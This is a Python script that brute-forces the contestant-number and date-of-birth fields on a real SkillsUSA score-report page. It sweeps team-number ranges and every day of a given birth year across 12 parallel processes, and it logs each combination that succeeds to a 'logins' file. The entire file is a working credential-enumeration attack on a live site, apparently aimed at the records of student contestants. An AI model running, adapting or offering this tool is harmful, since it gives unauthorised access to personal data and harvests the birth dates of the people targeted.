#!/usr/bin/env python3

import time
import requests
from multiprocessing import Pool
from simple_term_menu import TerminalMenu
import bs4
BeautifulSoup = bs4.BeautifulSoup


url = "https://www.skillsusa-register.org/rpts/Eventscoredetails.aspx"
noMatch = "No Matching Contestant Scores Found"
sqlException = "System.Data.SqlClient.SqlException"
payload = {
"__EVENTTARGET": "",
"__EVENTARGUMENT": "",
"__LASTFOCUS": "",
"__VIEWSTATE": "",
"__VIEWSTATEGENERATOR": "EA0F13DF",
"__EVENTVALIDATION": "",
"cboEvent": None,
"cboContest": None,
"txtConSeq": None,
"txtDOB": None,
}
log = 'Skills_logins.txt'

def main():
    year = input("[*] Enter Event Year: ")
    req = requests.get(url)
    EventID = parse(req.text, "cboEvent", year)
    payload["cboEvent"] = EventID
    payload['__EVENTTARGET'] = "cboEvent"
    req = requests.post(url, data=payload)
    ContestID = parse(req.text, "cboContest", None)
    payload['cboContest'] = ContestID
    payload['__EVENTTARGET'] = ""
    team, dob = userInput()
    payload["btnSubmit"] = "View+Scores"
    open(log, 'w').write("\x00")
    start_time = time.time()
    branch(team, dob)
    print(f"[*] Time Total = {time.time()-start_time} Seconds")

def parse(html, id, year):
    soup = BeautifulSoup(html, "html.parser").find("select", id=id).contents
    for i in soup:
        if type(i) == bs4.NavigableString:
            soup.remove(i)
    bs_menu = []
    tm_menu = []
    for option in soup:
        if year != None:
            if year in str(option):
                bs_menu.append(option)
                tm_menu.append(str(option.text))
        else:
            bs_menu.append(option)
            tm_menu.append(str(option.text))
    index = menu(tm_menu, id)
    ID = bs_menu[index]["value"]
    return ID

def bruteDate(Overload):
    team = Overload[0]
    year = Overload[1]
    month = Overload[2]
    days = Overload[3]
    data = payload
    data["txtConSeq"] = team
    for day in range(1, days + 1):
        dob = f"{month}/{day}/{year}"
        data["txtDOB"] = dob
        C = requests.post(url, data=data)
        if C.status_code != 200:
            print(C.status_code)
        if (check(C.text)):
            valid(team, dob)

def menu(options, title):
    menu = TerminalMenu(options, title=title)
    index = menu.show()
    return index

def userInput():
    print("[*] Enter a Team number or range to search")
    team = input("[*] (1234)/(1000-1999): ")
    print("[*] Enter DOB or year of birth to search")
    dob = input("[*] (mm/dd/yyyy)/(yyyy): ")
    return team, dob

def branch(team, dob):
    if len(team) == 4:
        payload['txtConSeq'] = team
        proc(team, dob)
    elif len(team) == 9:
        team = team.split('-')
        lower = int(team[0])
        upper = int(team[1])
        for number in range(lower, upper + 1):
            team = str(number)
            print(f"[*] Trying team {number}")
            payload['txtConSeq'] = str(number)
            proc(team, dob)

def proc(team, dob):
    if len(dob) > 8:
        payload["txtDOB"] = dob
        C = requests.post(url, data=payload).text
        if check(C):
            valid(team, dob)
    elif len(dob) == 4:
        with Pool(12) as p:
            p.map(bruteDate, [(team,dob,1,31),(team,dob,2,29),(team,dob,3,31),(team,dob,4,30),(team,dob,5,31),(team,dob,6,30),(team,dob,7,31),(team,dob,8,31),(team,dob,9,30),(team,dob,10,31),(team,dob,11,30),(team,dob,12,31)])

def check(html):
    if noMatch in html:
        return False
    elif sqlException in html:
        return False
    else:
        return True

def valid(team, dob):
    print(f'[*] Team {team} : DOB {dob}')
    if team not in open(log, 'r').read():
        open(log, 'a').write(f"Team {team},DOB {dob}\n")

if __name__ == "__main__":
    main()
